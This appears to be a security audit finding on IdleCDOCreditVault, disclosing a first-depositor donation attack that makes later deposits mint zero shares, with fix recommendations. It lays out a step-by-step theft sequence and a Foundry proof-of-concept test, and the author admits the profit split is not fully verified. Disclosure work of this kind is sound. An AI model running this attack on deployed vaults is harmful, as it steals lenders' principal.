### Title
Donation-based share inflation lets a first depositor steal later lenders' deposits via unsanitized `getContractValue()` in `_updateAccounting` - (File: contracts/IdleCDOCreditVault.sol)

### Summary
The kTAF exploit is a CompoundV2-style share-price inflation/donation attack. The analog exists in the credit vault: `IdleCDOCreditVault.getContractValue()` counts the raw `token` balance held by the CDO, and `_deposit()` runs `_updateAccounting()` — which consumes `getContractValue()` — *without* first calling `_skimDonatedAssets()`. An attacker can therefore inflate the tranche NAV/price with a direct `transfer` and cause a subsequent victim deposit to mint 0 tranche shares while still crediting the victim's full principal to `lastNAVAA`, which the attacker's pre-existing shares then claim.

### Finding Description
`_updateAccounting()` computes `nav = getContractValue()` [1](#0-0) , and `getContractValue()` includes `_contractTokenBalance(token)` — i.e. any unsolicited (donated) underlyings [2](#0-1) . The donation is then crystallized into `lastNAVAA`/`lastNAVBB` and the tranche price via `_virtualPriceAux` [3](#0-2) .

The codebase clearly recognizes this bug class — `_skimDonatedAssets()` is called in `updateAccounting()`, `startEpoch()`, `stopEpoch()`, `depositDuringEpoch()` and `finalizeDefault()` [4](#0-3) [5](#0-4)  — and `virtualPrice()` deliberately uses `_managedContractValue()`, which excludes raw underlyings [6](#0-5) . But `_deposit()` itself never skims before `_updateAccounting()` [7](#0-6) , leaving the deposit path exposed.

Attack sequence (buffer phase, fixed-APR mode):

1. Attacker (a KYC-passed lender, allowed per rules) calls `depositAA(1)` — first depositor, gets 1 share, `lastNAVAA = 1`.
2. Attacker `transfer`s a large donation `D` directly to the CDO contract.
3. Attacker calls `depositAA(1)` again. `_updateAccounting()` sees `nav = managed + D`, books `D` as gain, sets `priceAA ≈ (1 + D)` per share [8](#0-7) .
4. Victim calls `depositAA(V)` with `V < priceAA`. `_mintSharesAtCurrPrice` computes `_minted = V * ONE_TRANCHE_TOKEN / priceAA = 0` [9](#0-8) , but `_mintShares` still adds the full `V` to `lastNAVAA` [10](#0-9)  and `strategy.deposit(V)` pulls the victim's underlyings into the strategy [11](#0-10) .
5. In the next epoch cycle the attacker submits `requestWithdraw` for his 1 share; the claim is backed by NAV that now includes the victim's `V`. Attacker receives `1 + D + V` worth of underlying for a cost of `D + 2` — net profit `≈ V - 1`.

### Impact Explanation
Direct theft of lender principal: every deposit smaller than the inflated price mints zero shares yet is fully credited to the tranche NAV, so the attacker (sole early shareholder) captures 100% of the victim's deposit through normal withdrawal claims. The broken invariant is fair mint/burn plus donation isolation — the skim protection added everywhere else is missing on the deposit path, so an unprivileged EOA/lender can convert donated funds into a manipulated mint price.

### Likelihood Explanation
Requires no privileged action: a first (or dominant) depositor, one raw `transfer`, and one normal deposit in the buffer phase. The only precondition is that the attacker holds a large enough share of the tranche supply so the donated gain accrues mostly to himself — trivially satisfied as first depositor, which is a realistic state for any newly deployed or freshly reopened vault. Fee-on-transfer tokens or skim timing do not block it; `_guarded`/limit checks only cap amounts, and `_checkDefault` does not revert because `_strategyPrice` is unchanged. Note: the exact profit split depends on `_skimDonatedAssets` internals I could not fully read within tool limits — if a later interaction skims the residual raw balance before the victim's `V` reaches the strategy, impact shifts from theft to accounting mismatch/insolvency, but the mint-0-shares primitive stands either way.

### Recommendation
Call `_skimDonatedAssets()` at the top of `_deposit()` (before `_updateAccounting()`), or change `_updateAccounting()` to use `_managedContractValue()` instead of `getContractValue()` so raw underlyings can never be crystallized as tranche gains. Additionally consider enforcing a minimum mint (`_minted > 0`) in `_mintSharesAtCurrPrice` and/or minting initial dead shares on first deposit.

### Proof of Concept
Foundry test (extend `test/foundry/IdleCreditVault.t.sol` harness, buffer phase before `startEpoch`):

```solidity
function testDonationInflationStealsVictimDeposit() external {
    // attacker is a KYC'd lender
    address attacker = makeAddr("attacker");
    uint256 donation = 5_000 * ONE_SCALE;
    uint256 victimDep = 1_000 * ONE_SCALE;

    // 1) first depositor
    deal(defaultUnderlying, attacker, 1 + donation);
    vm.startPrank(attacker);
    IERC20Detailed(defaultUnderlying).approve(address(cdoEpoch), type(uint256).max);
    cdoEpoch.depositAA(1);

    // 2) raw donation to the CDO (not skimmed on deposit path)
    underlying.transfer(address(cdoEpoch), donation);

    // 3) second deposit crystallizes donation into priceAA
    cdoEpoch.depositAA(1);
    vm.stopPrank();

    uint256 priceAA = cdoEpoch.priceAA();
    assertGt(priceAA, victimDep); // 1 share now priced above victim deposit

    // 4) victim deposits -> mints 0 shares, lastNAVAA += victimDep
    address victim = makeAddr("victim");
    deal(defaultUnderlying, victim, victimDep);
    vm.startPrank(victim);
    IERC20Detailed(defaultUnderlying).approve(address(cdoEpoch), victimDep);
    uint256 minted = cdoEpoch.depositAA(victimDep);
    vm.stopPrank();
    assertEq(minted, 0, "victim got shares");

    // 5) epoch lifecycle: attacker requests + claims withdraw and recovers victim principal
    uint256 attackerShares = AAtranche.balanceOf(attacker);
    uint256 requested = cdoEpoch.requestWithdraw(attackerShares, address(AAtranche));
    assertApproxEqAbs(requested, donation + victimDep, ONE_SCALE, "attacker claims victim funds");
}
```

### Citations

**File:** contracts/IdleCDOCreditVault.sol (L125-128)
```text
  function getContractValue() public override view returns (uint256) {
    // Credit vault strategy tokens are minted 1:1 with underlyings and use the same decimals.
    return _contractTokenBalance(strategyToken) + _contractTokenBalance(token) - unclaimedFees;
  }
```

**File:** contracts/IdleCDOCreditVault.sol (L133-137)
```text
  function _managedContractValue() internal virtual view returns (uint256) {
    uint256 strategyTokenBalance = _contractTokenBalance(strategyToken);
    uint256 fees = unclaimedFees;
    return strategyTokenBalance > fees ? strategyTokenBalance - fees : 0;
  }
```

**File:** contracts/IdleCDOCreditVault.sol (L200-206)
```text
    _updateAccounting();
    // get underlyings from sender
    address _token = token;
    uint256 _preBal = _contractTokenBalance(_token);
    _transferUnderlyingsFrom(msg.sender, address(this), _amount);
    // mint tranche tokens according to the current tranche price
    _minted = _mintSharesAtCurrPrice(_contractTokenBalance(_token) - _preBal, msg.sender, _tranche);
```

**File:** contracts/IdleCDOCreditVault.sol (L211-211)
```text
    IIdleCDOStrategy(strategy).deposit(_amount);
```

**File:** contracts/IdleCDOCreditVault.sol (L227-227)
```text
    uint256 nav = getContractValue();
```

**File:** contracts/IdleCDOCreditVault.sol (L233-236)
```text
    (uint256 _priceAA, int256 _totalAAGain) = _virtualPriceAux(AATranche, nav, _lastNAV, _lastNAVAA, _aprSplitRatio);
    (uint256 _priceBB, int256 _totalBBGain) = _virtualPriceAux(BBTranche, nav, _lastNAV, _lastNAVBB, _aprSplitRatio);
    lastNAVAA = uint256(int256(_lastNAVAA) + _totalAAGain);
    lastNAVBB = uint256(int256(_lastNAVBB) + _totalBBGain);
```

**File:** contracts/IdleCDOCreditVault.sol (L335-336)
```text
    // Split the new NAV (_lastTrancheNAV + _totalTrancheGain) per tranche token
    _virtualPrice = uint256(int256(_lastTrancheNAV) + _totalTrancheGain) * ONE_TRANCHE_TOKEN / trancheSupply;
```

**File:** contracts/IdleCDOCreditVault.sol (L344-347)
```text
  function _mintSharesAtCurrPrice(uint256 _amount, address _to, address _tranche) internal virtual returns (uint256 _minted) {
    // calculate # of tranche token to mint based on current tranche price: _amount / tranchePrice
    _minted = _amount * ONE_TRANCHE_TOKEN / _tranchePrice(_tranche);
    _mintShares(_tranche, _to, _minted, _amount);
```

**File:** contracts/IdleCDOCreditVault.sol (L355-362)
```text
  function _mintShares(address _tranche, address _to, uint256 _shares, uint256 _underlyings) internal {
    IdleCDOTranche(_tranche).mint(_to, _shares);
    // update NAV with the _amount of underlyings added
    if (_tranche == AATranche) {
      lastNAVAA += _underlyings;
    } else {
      lastNAVBB += _underlyings;
    }
```

**File:** contracts/IdleCDOEpochVariant.sol (L155-161)
```text
  /// @notice Skim raw donated underlyings before forcing accounting.
  /// @dev Prevents unsolicited transfers from being crystallized as tranche gains by manual accounting.
  function updateAccounting() external override {
    _checkOnlyOwnerOrGuardian();
    _skimDonatedAssets();
    _forceUpdateAccounting();
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L241-242)
```text
    // Remove raw donated underlyings before calculating epoch interest or borrower transfer amounts.
    _skimDonatedAssets();
```
